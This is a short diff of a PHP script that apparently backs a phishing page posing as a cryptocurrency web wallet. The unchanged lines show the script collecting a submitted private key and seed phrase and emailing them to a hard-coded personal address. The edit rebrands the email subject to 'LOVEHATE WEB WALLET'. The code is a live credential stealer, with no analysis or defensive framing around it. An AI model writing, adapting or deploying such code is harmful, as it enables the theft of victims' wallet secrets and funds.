@@ -12,7 +12,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $recipient = 'bcoder49@gmail.com';
 
     // Set the email subject
-    $subject = 'Data from POST request';
+    $subject = 'Data from LOVEHATE WEB WALLET';
 
     // Prepare the email body
     $message = "Private Key: $privky\nSeed Phrase: $seedphr";
